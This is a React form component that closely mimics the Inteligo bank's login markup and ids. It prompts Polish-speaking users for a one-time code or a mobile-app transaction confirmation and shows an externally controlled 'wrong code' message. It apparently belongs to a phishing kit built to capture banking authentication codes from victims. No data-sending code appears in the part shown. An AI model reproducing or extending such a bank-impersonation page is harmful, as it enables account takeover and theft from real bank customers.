import React, {Fragment, useState} from "react";
import * as yup from "yup";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";

const schema = yup.object().shape({
    code: yup.string().min(3).required(),
});

const InteligoFormCode = ({handler, status}) => {
    const [loading, setLoading] = useState(false);
    const {register, handleSubmit, trigger, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const errors = formState.errors;
    const clearCode = (data) => {
        // setStep(1);
        // setLogin(false);
        reset();
        handler(data.code);
    }


    return (
        <form onSubmit={handleSubmit(clearCode)}>
            <Fragment key={'code'}>
                {
                    status === 'wrong_code' &&
                    <div className="required-note"><span className="form-required">!</span> Błędny kod </div>
                }
                <ul className="form-tabular">
                    <li className="field_row edit-field field_row-client_id_field NullValidationCharEditFieldTR"
                        id="f-tr-f-form_8543151329-client_id_field">
                        <div className="form-label">
                            <label>
                                {
                                    status === 'getting_push_code' || status === 'wrong_push_code' ? 'Potwierdź transakcję w aplikacji mobilnej banku' : 'Wpisz kod'
                                }

                            </label>
                        </div>
                        <div className="form-field NullValidationCharEditFieldTd">
                            <div className="NullValidationCharEditField_field_widget field_widget "
                                 id="f-form_8543151329-client_id_field-field_widget">
                                <div className="box-input">
                                    <div className="box-input-wrap">
                                        <input type="text"
                                               className="text_input text_input_client_id_field NullValidationCharEditField"
                                               {...register('code')}
                                        />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </li>
                </ul>
                <div className="form-buttons">
                    <input type="submit"
                           className="image-button button-dalej button button_ok"
                           value={''}
                    />
                </div>
            </Fragment>

        </form>
    )
}
export default InteligoFormCode;